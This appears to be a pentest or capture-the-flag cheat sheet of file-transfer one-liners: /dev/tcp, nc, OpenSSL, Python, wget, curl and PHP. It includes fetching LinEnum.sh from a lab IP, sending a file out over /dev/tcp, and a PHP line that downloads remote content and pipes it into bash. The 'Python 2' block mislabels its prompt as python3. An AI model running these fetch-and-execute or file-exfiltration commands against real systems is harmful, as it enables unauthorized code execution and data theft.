## Bash

```bash
# Connect to Target's Webserver
exec 3<>/dev/tcp/10.10.10.32/80

# HTTP GET Request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

Print the Response
cat <&3
```

## Bash (TCP)

```bash
cat < <file> > /dev/tcp/<ip>/<port>

# Escucha
nc -nlvp <port> > <file>
```

## OpenSSL


```bash
# Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Stand up server
openssl s_server -quiet -accept <port> -cert certificate.pem -key key.pem < <file>

# Download file
openssl s_client -connect <ip>:<port> -quiet > <file>
```

## Python 3

```python
~ python3
>> import urllib.request
>> urllib.request.urlretrieve("http://<ip>/<file>", "<output>")
````

## Python 2

```python
~ python3
>> import urllib
>> urllib.urlretrieve ("http://<ip>/<file>", "<output>")
````

## Wget

```bash
wget http://<ip>/<file> 
wget http://<ip>/<file> -O <file>
```

## Curl

```bash
curl -o <output> http://<ip>/<file>
```

## PHP

### File_get_contents()

```bash
php -r '$file = file_get_contents("<ip>/<file>"); file_put_contents("<file>",$file);'
```

### Fopen()

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("http://<ip>/<file>", "rb"); $flocal = fopen("<output>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

### Php curl

```bash
php -r '$rfile = "http://<ip>/<file>"; $lfile = "<output>"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
```

```bash
 php -r '$lines = @file("http://<ip>/<file>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
